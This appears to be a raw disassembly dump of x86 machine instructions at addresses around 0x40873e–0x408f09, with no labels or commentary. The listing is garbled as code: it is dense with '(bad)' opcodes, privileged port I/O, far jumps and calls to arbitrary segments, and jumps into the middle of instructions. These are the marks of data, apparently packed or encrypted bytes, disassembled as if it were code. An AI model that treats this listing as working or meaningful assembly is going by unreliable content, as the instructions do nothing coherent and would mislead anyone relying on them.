  40873e:	sub    DWORD PTR [ebp+0x6be17e81],ecx
  408744:	sub    eax,0xc38cbf56
  408749:	inc    edi
  40874a:	sbb    cl,BYTE PTR [esi+0x14]
  40874d:	adc    ch,BYTE PTR [eax+0xb52ba9a]
  408753:	pop    esi
  408754:	cmp    BYTE PTR [ebp+0x2ae95837],0x7d
  40875b:	or     dh,BYTE PTR [ebp-0x5]
  40875e:	aad    0xa1
  408760:	loop   0x40877b
  408762:	sub    BYTE PTR [esp+ecx*1],0x9b
  408766:	sbb    eax,0xc0faf0b7
  40876b:	mov    eax,0x84abc364
  408770:	cmp    dh,BYTE PTR ds:0xb45898f0
  408776:	icebp  
  408777:	and    BYTE PTR [ecx+0x29b701d6],ah
  40877d:	push   0xdcad6b3b
  408782:	xchg   esp,eax
  408783:	push   0xffffffad
  408785:	add    bl,cl
  408787:	out    dx,al
  408788:	mov    ds:0xe94927ba,al
  40878d:	rcr    DWORD PTR [esi-0x473cc5d9],0x13
  408794:	in     al,0x47
  408796:	mov    eax,0x90691d66
  40879b:	jg     0x4087ce
  40879d:	mov    cl,0xe0
  40879f:	cvtpi2ps xmm1,QWORD PTR [edi]
  4087a2:	pop    edx
  4087a3:	mov    al,ds:0xc73e2e1b
  4087a8:	lods   eax,DWORD PTR ds:[esi]
  4087a9:	push   ebp
  4087aa:	cmp    dh,bh
  4087ac:	cmp    DWORD PTR [eax-0x60],ecx
  4087af:	ja     0x408811
  4087b1:	cmp    al,0x71
  4087b3:	outs   dx,BYTE PTR ds:[esi]
  4087b4:	es xchg ebp,eax
  4087b6:	jl     0x4087c4
  4087b8:	push   eax
  4087b9:	ror    BYTE PTR ds:0x4ee7947c,cl
  4087bf:	ja     0x408743
  4087c1:	pop    esp
  4087c2:	shr    BYTE PTR [edi+0x0],1
  4087c5:	and    eax,0xd6d3915b
  4087ca:	ret    0x8d00
  4087cd:	stos   DWORD PTR es:[edi],eax
  4087ce:	cs cmp DWORD PTR fs:[ecx+0x26],edx
  4087d3:	dec    edi
  4087d4:	in     eax,0x45
  4087d6:	repz push edi
  4087d8:	push   edx
  4087d9:	scas   eax,DWORD PTR es:[edi]
  4087da:	jl     0x408846
  4087dc:	pop    ecx
  4087dd:	out    0x8,eax
  4087df:	mov    DWORD PTR [edx],esp
  4087e1:	jmp    0xb1a98753
  4087e6:	pop    edi
  4087e7:	sbb    ebp,0x93f72fda
  4087ed:	loopne 0x408840
  4087ef:	es inc esp
  4087f1:	sbb    dl,dh
  4087f3:	out    dx,al
  4087f4:	push   esi
  4087f5:	add    edi,DWORD PTR [eax+0x3f]
  4087f8:	pop    es
  4087f9:	out    dx,al
  4087fa:	repz jne 0x4087b0
  4087fd:	ss out dx,al
  4087ff:	(bad)  
  408800:	(bad)
  408803:	xchg   esp,eax
  408804:	cmc    
  408805:	xchg   esp,eax
  408806:	aam    0x76
  408808:	ret    0x8cda
  40880b:	(bad)  
  40880c:	xchg   edi,eax
  40880d:	mov    eax,ds:0x8fd7424d
  408812:	sbb    edx,DWORD PTR [ebx]
  408814:	inc    ebp
  408815:	inc    ebp
  408816:	loope  0x4087d5
  408818:	cmp    eax,0xabb3384b
  40881d:	in     al,dx
  40881e:	add    ch,BYTE PTR [ecx+0x4b]
  408821:	mov    WORD PTR [ebx+0x78f406f5],ss
  408827:	mov    al,0xdb
  408829:	pop    esi
  40882a:	ret    0x9751
  40882d:	rcr    ah,1
  40882f:	fimul  DWORD PTR [edi+0x2cfc2aab]
  408835:	and    al,0x87
  408837:	sub    al,0xd7
  408839:	dec    edx
  40883a:	loopne 0x408880
  40883c:	fwait
  40883d:	ret    0xea60
  408840:	jnp    0x4087d9
  408842:	push   edi
  408843:	and    DWORD PTR [eax-0x3c9be19],ecx
  408849:	cld    
  40884a:	jo     0x40885b
  40884c:	fisttp WORD PTR [esi+eax*1+0x4f]
  408850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408851:	xchg   ecx,eax
  408852:	lahf   
  408853:	ret    0x83f4
  408856:	jg     0x40884b
  408858:	dec    ecx
  408859:	arpl   WORD PTR [ebx+0x1235764d],bx
  40885f:	push   0x60
  408861:	ja     0x4088b0
  408863:	addr16 xchg esp,eax
  408865:	inc    eax
  408866:	aam    0x1a
  408868:	push   cs
  408869:	je     0x40887e
  40886b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40886c:	mov    DWORD PTR [esp+eiz*2+0x426fb9b1],ebx
  408873:	imul   BYTE PTR [ebp+0x39]
  408876:	cmp    ch,BYTE PTR [esi+edx*2+0x67fb9932]
  40887d:	stos   BYTE PTR es:[edi],al
  40887e:	pop    es
  40887f:	mov    al,0x8d
  408881:	in     eax,0xd
  408883:	or     edi,DWORD PTR [edi+0x2cd470c]
  408889:	inc    ebx
  40888a:	pusha  
  40888b:	push   ds
  40888c:	daa    
  40888d:	jns    0x40886b
  40888f:	cmp    eax,0x9f0cb2d6
  408894:	sti    
  408895:	dec    esi
  408896:	les    eax,FWORD PTR [eax+0x26434f4f]
  40889c:	xchg   esp,eax
  40889d:	popa   
  40889e:	loop   0x408873
  4088a0:	xor    cl,BYTE PTR [ebx+0x3226effb]
  4088a6:	inc    ecx
  4088a7:	mov    bl,0xb4
  4088a9:	dec    eax
  4088aa:	pop    ebx
  4088ab:	adc    DWORD PTR [ecx],ebx
  4088ad:	pop    ebx
  4088ae:	adc    DWORD PTR [ebp-0x52f541ed],0x19
  4088b5:	and    BYTE PTR [edi+0x274e20c8],ah
  4088bb:	inc    ebx
  4088bc:	call   0xf6619496
  4088c1:	mov    cl,0x1d
  4088c3:	test   BYTE PTR [ebx-0x2ab8df2d],cl
  4088c9:	arpl   WORD PTR [ecx],si
  4088cb:	pop    eax
  4088cc:	in     al,dx
  4088cd:	mov    cl,al
  4088cf:	je     0x4088f6
  4088d1:	out    0xe0,al
  4088d3:	imul   dx,WORD PTR [ebx],0x60
  4088d7:	arpl   WORD PTR [edi],bx
  4088d9:	sub    ch,BYTE PTR [esi]
  4088db:	xor    edi,DWORD PTR [ecx]
  4088dd:	mov    WORD PTR [esi-0x3c59408e],fs
  4088e3:	xchg   edi,eax
  4088e4:	and    al,0x15
  4088e6:	mov    dh,0xde
  4088e8:	dec    ebx
  4088e9:	shl    BYTE PTR [esp+ecx*4],0x3b
  4088ed:	and    ebx,DWORD PTR [ebp-0x7]
  4088f0:	mov    BYTE PTR [ebx],ch
  4088f2:	fiadd  WORD PTR [edi+0x23]
  4088f5:	cld    
  4088f6:	lods   al,BYTE PTR ds:[esi]
  4088f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088f8:	inc    esi
  4088f9:	fisub  WORD PTR [edi+0x69d90b62]
  4088ff:	or     eax,0x5c6e07cd
  408904:	mov    edx,0xdc1344fe
  408909:	lods   eax,DWORD PTR ds:[esi]
  40890a:	cmp    DWORD PTR [edi+eax*1],esi
  40890d:	aas    
  40890e:	in     eax,0xe0
  408910:	mov    ds:0x2f08b0b9,eax
  408915:	das    
  408916:	outs   dx,DWORD PTR ds:[esi]
  408917:	and    ah,BYTE PTR [ecx-0x73382e31]
  40891d:	test   eax,0x8f641850
  408922:	or     cl,BYTE PTR ds:0x3e6e0498
  408928:	jne    0x40890f
  40892a:	xlat   BYTE PTR ds:[bx]
  40892c:	sbb    DWORD PTR [edx-0x59],ecx
  40892f:	adc    BYTE PTR [edx],dh
  408931:	fwait
  408932:	lock out 0x8c,eax
  408935:	fs ret 
  408937:	sub    eax,DWORD PTR [edx]
  408939:	hlt    
  40893a:	lock sbb dl,BYTE PTR [ecx+0x48c2a104]
  408941:	cmp    esi,ebp
  408943:	addr16 pop ebx
  408945:	cdq    
  408946:	out    0xc1,eax
  408948:	mov    eax,DWORD PTR ds:0xfbab09e3
  40894e:	pop    ss
  40894f:	aad    0xd1
  408951:	mov    edx,0x96ffb79c
  408956:	lods   al,BYTE PTR ds:[esi]
  408957:	or     eax,0x9fef2fa6
  40895c:	adc    BYTE PTR [ecx+0x2d62d01e],bl
  408962:	jbe    0x408949
  408964:	pop    ecx
  408965:	xchg   BYTE PTR [ecx+0x68],bl
  408968:	jmp    0xb3db:0xf9498115
  40896f:	ror    bh,cl
  408971:	mov    edi,0xf920dcc
  408976:	mov    al,0xd6
  408978:	mov    ecx,0x716db7
  40897d:	cmp    al,0x85
  40897f:	jl     0x40894e
  408981:	shl    ch,cl
  408983:	fdivr  QWORD PTR [edx-0x34]
  408986:	xor    BYTE PTR [edi-0x53],ah
  408989:	stos   BYTE PTR es:[edi],al
  40898a:	fnstcw WORD PTR [eax+0x31]
  40898d:	pop    eax
  40898e:	and    esp,DWORD PTR [ebp+eiz*2-0x625f0489]
  408995:	fbld   TBYTE PTR [eax-0x3fdaea8e]
  40899b:	iret   
  40899c:	aad    0x18
  40899e:	xchg   ebx,eax
  40899f:	mov    ds:0x73540e2a,eax
  4089a4:	cmc    
  4089a5:	and    BYTE PTR cs:[ecx],bh
  4089a8:	push   ecx
  4089a9:	sti    
  4089aa:	cld    
  4089ab:	cvttps2pi mm0,QWORD PTR [ebp-0x7aa99b28]
  4089b2:	or     al,0x1b
  4089b4:	sbb    eax,0x65943a7
  4089b9:	cmp    eax,0x82b36d6
  4089be:	add    ebp,esi
  4089c0:	inc    ebx
  4089c1:	xchg   edx,eax
  4089c2:	nop
  4089c3:	jmp    0x7f20feac
  4089c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c9:	aam    0xd0
  4089cb:	pop    ebp
  4089cc:	xchg   ecx,eax
  4089cd:	das    
  4089ce:	dec    eax
  4089cf:	sub    eax,DWORD PTR [ebx-0x72142927]
  4089d5:	call   0x4520:0xe74b7369
  4089dc:	mov    ebp,0x50b508a4
  4089e1:	jne    0x40899f
  4089e3:	ds and al,0x44
  4089e6:	sahf   
  4089e7:	sbb    al,0xb9
  4089e9:	fldenv [ebp+eax*1-0x32a1c27e]
  4089f0:	jp     0x4089e3
  4089f2:	aas    
  4089f3:	dec    DWORD PTR [edi+edi*8]
  4089f6:	addr16 js 0x408a2f
  4089f9:	loopne 0x408a4b
  4089fb:	push   eax
  4089fc:	xor    dh,BYTE PTR [esi-0x13]
  4089ff:	fstp   QWORD PTR [esi+0x1a]
  408a02:	cmp    eax,0x17909295
  408a07:	dec    edx
  408a08:	fcom   QWORD PTR [esi]
  408a0a:	pop    esi
  408a0b:	cmp    eax,DWORD PTR [ecx+0x70d0ea85]
  408a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a12:	fwait
  408a13:	jb     0x4089cd
  408a15:	push   ds
  408a16:	rcl    BYTE PTR [ecx-0x76],1
  408a19:	sbb    DWORD PTR [edi],0x72d7b30d
  408a1f:	jnp    0x4089bc
  408a21:	jnp    0x4089c4
  408a23:	inc    edi
  408a24:	mov    bh,0xf2
  408a26:	mov    al,ds:0x2a3402f9
  408a2b:	scas   al,BYTE PTR es:[edi]
  408a2c:	adc    edx,edi
  408a2e:	jne    0x408a39
  408a30:	data16 and dl,BYTE PTR [ecx-0x3a]
  408a34:	jmp    0x6bf9cd61
  408a39:	pop    eax
  408a3a:	lds    ebx,FWORD PTR [ecx+ebx*4+0x3e794474]
  408a41:	in     al,0x62
  408a43:	sbb    dh,BYTE PTR [ecx+ecx*1]
  408a46:	jl     0x408a81
  408a48:	jae    0x408a67
  408a4a:	mov    dl,0x6
  408a4c:	test   cl,ch
  408a4e:	std    
  408a4f:	pushf  
  408a50:	inc    edx
  408a51:	sub    al,0x90
  408a53:	jmp    0xe947:0x281d037
  408a5a:	mov    WORD PTR [edi],?
  408a5c:	sbb    DWORD PTR [eax],edi
  408a5e:	xchg   edx,eax
  408a5f:	stos   DWORD PTR es:[edi],eax
  408a60:	push   0x40
  408a62:	xchg   edx,eax
  408a63:	pop    ss
  408a64:	fild   DWORD PTR [edi-0x5a35a7a8]
  408a6a:	test   eax,0xbca21970
  408a6f:	lock js 0x408a8f
  408a72:	ins    BYTE PTR es:[edi],dx
  408a73:	es stos BYTE PTR es:[edi],al
  408a75:	or     eax,0xd9b2b650
  408a7a:	int3   
  408a7b:	sti    
  408a7c:	pop    eax
  408a7d:	jle    0x408a69
  408a7f:	mov    al,0x34
  408a81:	add    DWORD PTR [ebx+edx*8+0x5af9385],edi
  408a88:	(bad)  
  408a89:	(bad)  [esi+edi*2-0x31]
  408a8d:	xor    al,0xa3
  408a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a90:	loopne 0x408a4f
  408a92:	sub    eax,0xaf2b60e3
  408a97:	(bad)  [ebp+0x2b779e78]
  408a9d:	ds inc esi
  408a9f:	out    dx,eax
  408aa0:	sub    al,0x4d
  408aa2:	mov    esi,0x90d03147
  408aa7:	cmc    
  408aa8:	imul   ebx,DWORD PTR [edx],0xffffff97
  408aab:	out    0x46,eax
  408aad:	mov    al,0xe9
  408aaf:	xchg   edi,eax
  408ab0:	loop   0x408a58
  408ab2:	(bad)  
  408ab3:	mov    WORD PTR [esi-0x6ccbce76],ds
  408ab9:	cmc    
  408aba:	lods   eax,DWORD PTR ds:[esi]
  408abb:	imul   eax,DWORD PTR [esi],0xf2e25269
  408ac1:	jo     0x408aa6
  408ac3:	inc    edx
  408ac4:	stos   DWORD PTR es:[edi],eax
  408ac5:	cmp    edx,DWORD PTR [eax-0x15]
  408ac8:	pop    ecx
  408ac9:	or     dl,BYTE PTR [esi-0x4]
  408acc:	sbb    BYTE PTR [edx+0x2f43c071],ah
  408ad2:	sti    
  408ad3:	leave  
  408ad4:	clc    
  408ad5:	jmp    0x87f5:0xac30ce15
  408adc:	or     dl,dh
  408ade:	jge    0x408b5d
  408ae0:	push   es
  408ae1:	nop
  408ae2:	dec    eax
  408ae3:	pop    es
  408ae4:	out    0x81,al
  408ae6:	pop    ss
  408ae7:	or     ah,ch
  408ae9:	jmp    0xff56:0x14cd7bf7
  408af0:	ss sahf 
  408af2:	sbb    ebx,eax
  408af4:	arpl   bx,dx
  408af6:	in     al,dx
  408af7:	mov    ebx,0x2a338bb
  408afc:	test   edx,edx
  408afe:	or     eax,0x7f5e106f
  408b03:	xor    DWORD PTR [esi],eax
  408b05:	push   ds
  408b06:	pop    ss
  408b07:	dec    esi
  408b08:	xchg   ecx,eax
  408b09:	ins    BYTE PTR es:[edi],dx
  408b0a:	repz push ebp
  408b0c:	ins    BYTE PTR es:[edi],dx
  408b0d:	test   BYTE PTR [edx+0x2b7833cf],bh
  408b13:	addr16 ret 0x3432
  408b17:	je     0x408b0b
  408b19:	es pop esi
  408b1b:	adc    ebp,edx
  408b1d:	dec    ebx
  408b1e:	push   es
  408b1f:	ficom  DWORD PTR [edi+0x60]
  408b22:	pop    esi
  408b23:	and    edx,DWORD PTR [ebx-0x6d]
  408b26:	int    0x9a
  408b28:	fst    st(0)
  408b2a:	or     DWORD PTR [ecx+0x52],edi
  408b2d:	repz mov ecx,0x755363ad
  408b33:	jo     0x408b08
  408b35:	ins    DWORD PTR es:[edi],dx
  408b36:	cmp    ebp,DWORD PTR [edi-0x6d2421d4]
  408b3c:	xchg   esp,eax
  408b3d:	and    ah,BYTE PTR [edx]
  408b3f:	sub    DWORD PTR [edx-0x4ff7db16],ebx
  408b45:	lahf   
  408b46:	pop    es
  408b47:	jbe    0x408b85
  408b49:	push   ds
  408b4a:	pop    ecx
  408b4b:	mov    al,ds:0x6ea5f72
  408b50:	pusha  
  408b51:	es pop ebp
  408b53:	or     BYTE PTR [ebx-0xc],0x77
  408b57:	mov    dl,0x41
  408b59:	test   BYTE PTR gs:0xb9c1f867,dl
  408b60:	inc    eax
  408b61:	mov    esi,0x8b9e2c48
  408b66:	test   al,0xe6
  408b68:	dec    ebx
  408b69:	mov    ds:0x5f3d112c,eax
  408b6e:	popa   
  408b6f:	pushf  
  408b70:	repnz cli 
  408b72:	fdivr  DWORD PTR [edx*1+0x6e590d5f]
  408b79:	sub    esp,DWORD PTR [ecx-0x4e9fc051]
  408b7f:	mov    edx,0xa5a52d57
  408b84:	call   0x2a1b:0x69df105e
  408b8b:	jp     0x408bb9
  408b8d:	imul   ebx,ebx,0x48
  408b90:	sub    al,0xee
  408b92:	pushf  
  408b93:	popf   
  408b94:	inc    eax
  408b95:	pop    edx
  408b96:	pop    ecx
  408b97:	aas    
  408b98:	retf   
  408b99:	out    0x72,eax
  408b9b:	mov    eax,0xac48d413
  408ba0:	mov    edi,ebx
  408ba2:	mov    DWORD PTR [edi-0x7db13736],0x79c5ac22
  408bac:	xchg   esp,eax
  408bad:	shr    BYTE PTR [ebx+0x6fb2e9f],0xf
  408bb4:	mov    es,esp
  408bb6:	neg    ebx
  408bb8:	(bad)  
  408bb9:	jnp    0x408c35
  408bbb:	retf   
  408bbc:	mov    esi,cs
  408bbe:	xor    esp,DWORD PTR [ecx+0xafd93b4]
  408bc4:	adc    ebp,ecx
  408bc6:	fistp  QWORD PTR ds:0xcdc91e0c
  408bcc:	xor    esp,DWORD PTR [ebx-0x701443aa]
  408bd2:	out    dx,al
  408bd3:	pop    edi
  408bd4:	sub    eax,0x1e02514
  408bd9:	xlat   BYTE PTR ds:[ebx]
  408bda:	pop    esi
  408bdb:	out    0x3f,eax
  408bdd:	mov    dl,0x12
  408bdf:	jne    0x408c40
  408be1:	(bad)  
  408be2:	cmp    al,0xc2
  408be4:	or     BYTE PTR [ebp+0x3d],dl
  408be7:	scas   al,BYTE PTR es:[edi]
  408be8:	xchg   ecx,eax
  408be9:	jmp    0x821c17ee
  408bee:	mov    eax,0x356345e1
  408bf3:	mov    esi,0xd083eec0
  408bf8:	daa    
  408bf9:	(bad)  
  408bfa:	mov    ds:0x9e0b6ab6,eax
  408bff:	jno    0x408bea
  408c01:	rol    DWORD PTR [esi+0x62dbf92],1
  408c07:	out    0xf5,al
  408c09:	cmc    
  408c0a:	pop    esp
  408c0b:	fwait
  408c0c:	push   edi
  408c0d:	and    ebp,ecx
  408c0f:	clc    
  408c10:	fldenv ss:0x51eeb652
  408c17:	dec    ebp
  408c18:	test   al,0xf6
  408c1a:	sbb    ebp,DWORD PTR [eax-0x3747a612]
  408c20:	call   0x8485:0x935d069a
  408c27:	jns    0x408c1d
  408c29:	gs dec edi
  408c2b:	outs   dx,DWORD PTR ds:[esi]
  408c2c:	add    eax,0xf2cf5742
  408c31:	adc    edx,DWORD PTR [esi]
  408c33:	mov    ebx,0xa3c09bb0
  408c38:	in     al,dx
  408c39:	and    eax,0xf12f6857
  408c3e:	cmp    BYTE PTR [ecx+0x5c],0xb9
  408c42:	clc    
  408c43:	repnz pop edx
  408c45:	add    dl,dl
  408c47:	mov    dh,0x7b
  408c49:	jno    0x408cca
  408c4b:	jmp    0x34e48bb6
  408c50:	ret    
  408c51:	xlat   BYTE PTR ds:[ebx]
  408c52:	mov    ds:0x5c09d7b9,eax
  408c57:	ror    DWORD PTR [ebp+0x18089b61],1
  408c5d:	xchg   eax,ebx
  408c5f:	aad    0x60
  408c61:	jae    0x408c72
  408c63:	mul    ebx
  408c65:	in     eax,0xd2
  408c67:	adc    BYTE PTR [ecx-0x1b120648],dl
  408c6d:	push   esi
  408c6e:	adc    ecx,0xffffff9b
  408c71:	aaa    
  408c72:	sbb    BYTE PTR [ecx+0xefa8671],0x61
  408c79:	repnz scas eax,DWORD PTR es:[edi]
  408c7b:	xchg   edx,eax
  408c7c:	or     ch,BYTE PTR [edx]
  408c7e:	jne    0x408c93
  408c80:	push   cs
  408c81:	jns    0x408cd6
  408c83:	mov    ebx,edi
  408c85:	(bad)  
  408c86:	dec    edx
  408c87:	fst    DWORD PTR [edi-0x18]
  408c8a:	(bad)  
  408c8b:	ins    DWORD PTR es:[edi],dx
  408c8c:	out    0x1a,eax
  408c8e:	jl     0x408c36
  408c90:	mov    al,ds:0x2777ce5a
  408c95:	and    al,BYTE PTR [esi]
  408c97:	mov    ds:0xe5b1e7af,al
  408c9c:	xchg   ebp,eax
  408c9d:	in     eax,dx
  408c9e:	and    eax,0x61ec45f8
  408ca3:	arpl   sp,bx
  408ca5:	mov    BYTE PTR [ebx],dl
  408ca7:	or     al,0xd9
  408ca9:	jb     0x408d24
  408cab:	fadd   DWORD PTR [edx-0x5b]
  408cae:	ja     0x408ccf
  408cb0:	xchg   BYTE PTR [esi-0x20136d08],bl
  408cb6:	dec    ecx
  408cb7:	add    ebp,DWORD PTR [esi]
  408cb9:	fwait
  408cba:	icebp  
  408cbb:	stos   BYTE PTR es:[edi],al
  408cbc:	xor    ecx,DWORD PTR [ecx+0x3a]
  408cbf:	adc    BYTE PTR [edx+0x70],bl
  408cc2:	stos   DWORD PTR es:[edi],eax
  408cc3:	dec    ebp
  408cc4:	adc    ecx,DWORD PTR [eax]
  408cc6:	stc    
  408cc7:	push   es
  408cc8:	xchg   DWORD PTR [ebx],edx
  408cca:	inc    ebx
  408ccb:	xlat   BYTE PTR ds:[ebx]
  408ccc:	fisub  DWORD PTR [ecx-0x14b6cb18]
  408cd2:	add    ebp,DWORD PTR [edx+0x7b411445]
  408cd8:	pushf  
  408cd9:	push   ecx
  408cda:	inc    ebp
  408cdb:	stos   DWORD PTR es:[edi],eax
  408cdc:	out    dx,eax
  408cdd:	call   0x85f0079c
  408ce2:	push   edx
  408ce3:	outs   dx,BYTE PTR ds:[esi]
  408ce4:	jmp    0xdc4aad8f
  408ce9:	dec    edi
  408cea:	mov    BYTE PTR ds:0x6df894f1,al
  408cf0:	and    al,0x8f
  408cf2:	jl     0x408d21
  408cf4:	adc    dl,BYTE PTR [edx+0x39]
  408cf7:	leave  
  408cf8:	mov    edx,0x70d1fac5
  408cfd:	mov    dh,0x44
  408cff:	fs dec edx
  408d01:	push   esp
  408d02:	jns    0x408cd8
  408d04:	jp     0x408cc8
  408d06:	outs   dx,DWORD PTR ds:[esi]
  408d07:	test   al,0xcf
  408d09:	push   0xffffffb7
  408d0b:	sub    DWORD PTR [edi],ebp
  408d0d:	xor    DWORD PTR [ecx],edx
  408d0f:	fwait
  408d10:	fs sbb eax,0xe5bda0ab
  408d16:	outs   dx,BYTE PTR ds:[esi]
  408d17:	je     0x408cef
  408d19:	das    
  408d1a:	pop    edi
  408d1b:	out    0xfa,eax
  408d1d:	jmp    0x732ba5f2
  408d22:	mov    cl,0x44
  408d24:	jp     0x408d2b
  408d26:	add    edx,DWORD PTR [eax+0x79]
  408d29:	sub    al,0xd4
  408d2b:	jno    0x408d22
  408d2d:	mov    eax,0x698d9197
  408d32:	cmc    
  408d33:	fwait
  408d34:	hlt    
  408d35:	sbb    BYTE PTR [eax-0x7],0x7a
  408d39:	shr    edi,cl
  408d3b:	xchg   esp,eax
  408d3c:	cwde   
  408d3d:	enter  0x18cb,0xd1
  408d41:	icebp  
  408d42:	mov    ch,ah
  408d44:	xchg   ebx,eax
  408d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d46:	jp     0x408dc4
  408d48:	icebp  
  408d49:	rdtsc  
  408d4b:	dec    ebp
  408d4c:	mov    dl,0xfa
  408d4e:	mov    ch,0x5d
  408d50:	sub    BYTE PTR [ebp+0x6f9ea319],ah
  408d56:	sbb    DWORD PTR [ebx],edx
  408d58:	cmp    DWORD PTR [ebx],ecx
  408d5a:	je     0x408d67
  408d5c:	push   esp
  408d5d:	aad    0x25
  408d5f:	int    0xfc
  408d61:	mov    ebp,0x44578699
  408d66:	les    edx,FWORD PTR [ebp-0x49]
  408d69:	add    eax,edx
  408d6b:	and    BYTE PTR ds:0xd52a5dab,dl
  408d71:	xchg   ebx,eax
  408d72:	push   es
  408d73:	push   edx
  408d74:	cmc    
  408d75:	jno    0x408d3e
  408d77:	jne    0x408d6d
  408d79:	cmp    DWORD PTR [ecx+0xb9ca36c],eax
  408d7f:	icebp  
  408d80:	lds    eax,FWORD PTR ds:0x6cb226cf
  408d86:	jnp    0x408dc4
  408d88:	mov    bl,0xa5
  408d8a:	add    DWORD PTR [edx],esp
  408d8c:	mov    al,0x3f
  408d8e:	pop    ecx
  408d8f:	ret    0x610
  408d92:	fimul  DWORD PTR [edi]
  408d94:	push   0x1013ce6c
  408d99:	jb     0x408d2e
  408d9b:	lahf   
  408d9c:	mov    DWORD PTR [edx-0x3e],edi
  408d9f:	or     bh,bl
  408da1:	loop   0x408dee
  408da3:	mov    ecx,0xb27c6a87
  408da8:	aas    
  408da9:	jnp    0x408e00
  408dab:	xlat   BYTE PTR ds:[ebx]
  408dac:	rcl    DWORD PTR [edi-0x1fd2fba4],cl
  408db2:	mov    al,0x93
  408db4:	fbld   TBYTE PTR [ecx+0x625c45c2]
  408dba:	pop    esi
  408dbb:	mov    esp,0x28463670
  408dc0:	add    BYTE PTR [ebp-0x6d0b115b],ah
  408dc6:	xlat   BYTE PTR ds:[ebx]
  408dc7:	cmc    
  408dc8:	int    0xc7
  408dca:	push   esi
  408dcb:	jbe    0x408de0
  408dcd:	aas    
  408dce:	xchg   ebp,eax
  408dcf:	add    al,0x97
  408dd1:	sub    BYTE PTR [edi],al
  408dd3:	jle    0x408e46
  408dd5:	stc    
  408dd6:	and    DWORD PTR [esi+0x27],esp
  408dd9:	shl    BYTE PTR [ecx-0x23],0xe9
  408ddd:	mov    ds:0xf15394d1,al
  408de2:	adc    al,0xe6
  408de4:	out    dx,al
  408de5:	(bad)  
  408de6:	clc    
  408de7:	jo     0x408e06
  408de9:	clc    
  408dea:	push   es
  408deb:	dec    ebx
  408dec:	icebp  
  408ded:	and    DWORD PTR [ebx],esi
  408def:	sbb    eax,DWORD PTR [edx-0xd]
  408df2:	imul   ebx,DWORD PTR [ebp+0x3ca8968a],0x47273065
  408dfc:	push   ds
  408dfd:	and    BYTE PTR [eax-0x4a],dl
  408e00:	jo     0x408e40
  408e02:	xor    ecx,eax
  408e04:	jecxz  0x408ddb
  408e06:	dec    ebp
  408e07:	xchg   edx,eax
  408e08:	inc    ebp
  408e09:	push   esp
  408e0a:	jne    0x408dca
  408e0c:	mov    DWORD PTR [ecx+eiz*4],0x796c8d23
  408e13:	and    eax,0xcd8ba5fb
  408e18:	dec    edi
  408e19:	retf   
  408e1a:	in     al,dx
  408e1b:	pop    edi
  408e1c:	sub    eax,0x44c2e3f8
  408e21:	cmc    
  408e22:	push   ecx
  408e23:	inc    BYTE PTR [esi]
  408e25:	nop
  408e26:	jns    0x408e29
  408e28:	pop    esp
  408e29:	sbb    BYTE PTR [ebx],bh
  408e2b:	std    
  408e2c:	sbb    al,cl
  408e2e:	jmp    0xb7fd:0xa627152f
  408e35:	imul   ecx,ecx,0x163232a4
  408e3b:	aaa    
  408e3c:	sub    eax,0x7a6fd9af
  408e41:	xor    BYTE PTR [ebx-0xb4c8e2c],al
  408e47:	xlat   BYTE PTR ds:[ebx]
  408e48:	shr    BYTE PTR [esi-0x76],1
  408e4b:	mov    ebx,0x68c05d7c
  408e50:	add    DWORD PTR [edi+0x49818aee],0x6
  408e57:	push   edi
  408e58:	mov    WORD PTR [esi+0x11],es
  408e5b:	jae    0x408ecb
  408e5d:	and    DWORD PTR [ecx+ecx*2-0x2f],0x163143f7
  408e65:	mov    bh,0x77
  408e67:	xor    al,0x4f
  408e69:	jbe    0x408eda
  408e6b:	fs in  al,0x2f
  408e6e:	test   eax,0x9f218e88
  408e73:	mov    BYTE PTR [ebx+0x71],al
  408e76:	mov    ebx,0xc03ca85c
  408e7b:	sti    
  408e7c:	adc    dh,BYTE PTR [edi]
  408e7e:	sbb    al,BYTE PTR [edi-0x4]
  408e81:	(bad)  
  408e82:	into   
  408e83:	mov    cl,0x19
  408e85:	int    0xe2
  408e87:	or     DWORD PTR [ebx],0xffffffab
  408e8a:	popa   
  408e8b:	jne    0x408e17
  408e8d:	dec    ecx
  408e8e:	mov    ebx,0x4ccf21ef
  408e93:	outs   dx,BYTE PTR ds:[esi]
  408e94:	and    esi,eax
  408e96:	(bad)  
  408e97:	cld    
  408e98:	mov    ch,0xf0
  408e9a:	fwait
  408e9b:	dec    edi
  408e9c:	test   DWORD PTR [ebx],ebx
  408e9e:	sbb    DWORD PTR [eax-0x29c16f04],esp
  408ea4:	aam    0xa1
  408ea6:	pop    ds
  408ea7:	std    
  408ea8:	in     al,dx
  408ea9:	js     0x408e3b
  408eab:	mov    bh,0x8b
  408ead:	call   0x21e3:0x19903a57
  408eb4:	cmp    DWORD PTR [edi],edi
  408eb6:	and    al,0x84
  408eb8:	outs   dx,DWORD PTR ds:[esi]
  408eb9:	sbb    DWORD PTR [edi],ebp
  408ebb:	fst    QWORD PTR [ecx+esi*2+0x461779ed]
  408ec2:	rcr    bh,0xfc
  408ec5:	retf   0x245f
  408ec8:	xor    DWORD PTR [edi],ebx
  408eca:	sub    eax,0x51558de6
  408ecf:	xor    cl,BYTE PTR ds:0x92185b82
  408ed5:	out    dx,al
  408ed6:	push   ebx
  408ed7:	test   DWORD PTR [ecx+0x6ce60836],ebp
  408edd:	or     esi,esp
  408edf:	in     al,dx
  408ee0:	and    BYTE PTR [eax-0x78],ah
  408ee3:	add    dh,dh
  408ee5:	sub    esp,DWORD PTR [edx-0x59]
  408ee8:	stos   BYTE PTR es:[edi],al
  408ee9:	lea    edx,[ecx]
  408eeb:	(bad)  
  408eec:	jmp    0x408e7e
  408eee:	test   DWORD PTR [eax-0x7e7c51f9],edi
  408ef4:	lock ins BYTE PTR es:[edi],dx
  408ef6:	out    0xe4,eax
  408ef8:	add    esp,0xffffffaf
  408efb:	popf   
  408efc:	xchg   esi,eax
  408efd:	in     al,dx
  408efe:	in     eax,dx
  408eff:	jb     0x408ec7
  408f01:	push   ebx
  408f02:	nop
  408f03:	in     eax,0x9c
  408f05:	jb     0x408e95
  408f07:	(bad)  
  408f08:	lods   al,BYTE PTR ds:[esi]
  408f09:	(bad)  
